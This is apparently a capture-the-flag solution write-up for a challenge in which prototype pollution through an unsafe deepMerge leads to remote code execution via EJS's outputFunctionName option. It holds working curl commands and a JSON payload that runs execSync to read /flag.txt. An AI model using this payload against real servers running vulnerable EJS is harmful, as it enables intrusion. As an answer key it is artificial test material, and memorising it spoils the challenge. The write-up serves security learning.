# Prototype Pollution RCE - Solution

## Vulnerability

The `deepMerge` function in `server.js` iterates over source object keys using `for...in` without `hasOwnProperty` check, allowing pollution of `Object.prototype` via `__proto__`.

EJS uses `Object.prototype["view options"]` if set, and the `outputFunctionName` option in EJS < 3.1.10 allows injection of arbitrary JavaScript.

## Exploit

### Step 1: Login

```bash
curl -c cookies.txt -X POST http://TARGET:8080/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=user1&password=user1pass"
```

### Step 2: Pollute Object.prototype via __proto__

```bash
curl -b cookies.txt -X POST http://TARGET:8080/api/config \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"view options": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"cat /flag.txt\").toString();//"}}}'
```

### Step 3: Trigger EJS render to execute the payload

```bash
curl -b cookies.txt http://TARGET:8080/report?template=default
```

The response will contain the flag content because EJS injects the `outputFunctionName` into the compiled template function, causing command execution.

## Why it works

- `deepMerge({}, {"__proto__": {"view options": {...}}})` sets `Object.prototype["view options"]`
- EJS reads options via `opts = opts || {}` then accesses `opts["view options"]`
- Since every object inherits from Object.prototype, the polluted value is used
- `outputFunctionName` is placed directly into the compiled template string without sanitization
- This causes arbitrary JavaScript execution during template rendering

## Attack Chain Summary

```
POST /api/config  (pollute __proto__.outputFunctionName)
        |
        v
GET /report?template=default  (trigger EJS render)
        |
        v
EJS compiles template with injected outputFunctionName
        |
        v
execSync("cat /flag.txt") runs -> flag leaked in response
```

## Notes

- The `ejs@3.1.9` dependency specified in `package.json` is intentionally vulnerable (fix landed in 3.1.10).
- Any authenticated user (including the low-privilege `user1`) can trigger this — no admin required.
- The pollution is server-wide and persistent until restart, affecting all users.
